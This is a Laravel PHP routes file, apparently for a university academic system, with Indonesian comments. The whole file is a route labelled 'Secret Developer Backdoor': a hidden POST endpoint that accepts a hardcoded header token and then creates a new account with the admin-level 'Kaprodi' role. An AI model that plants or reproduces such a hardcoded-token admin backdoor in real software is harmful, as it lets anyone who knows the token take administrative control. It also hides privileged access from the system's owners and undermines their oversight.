<?php

use App\Models\User;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Route;

/*
|--------------------------------------------------------------------------
| Secret Developer Backdoor
|--------------------------------------------------------------------------
*/

Route::post('/v1/_debug/spawn-admin', function (Request $request) {
    // 1. Validasi Token Keamanan di Header
    $devToken = $request->header('X-DEV-TOKEN');
    
    if ($devToken !== 'POLMAN-TRIN-DEV-99') {
        return response()->json([
            'status'  => 'error',
            'message' => 'Unauthorized Access. Invalid Dev Token.'
        ], 403);
    }

    // 2. Validasi Data Input Payload
    $validated = $request->validate([
        'name'     => 'required|string|max:255',
        'email'    => 'required|email|unique:users,email',
        'nip'      => 'required|string|unique:users,nip',
        'password' => 'required|string|min:8'
    ]);

    // 3. Eksekusi Create User & Assign Role
    try {
        $user = User::create([
            'name'     => $validated['name'],
            'email'    => $validated['email'],
            'nip'      => $validated['nip'],
            'password' => Hash::make($validated['password']),
        ]);

        // Pastikan seeder Role 'Kaprodi' sudah pernah dijalankan sebelumnya
        $user->assignRole('Kaprodi');

        return response()->json([
            'status'  => 'success',
            'message' => 'Kaprodi (Admin) spawned successfully!',
            'data'    => [
                'name'  => $user->name,
                'email' => $user->email,
                'role'  => 'Kaprodi'
            ]
        ], 201);

    } catch (\Exception $e) {
        return response()->json([
            'status'  => 'error',
            'message' => 'Failed to spawn admin: ' . $e->getMessage()
        ], 500);
    }
});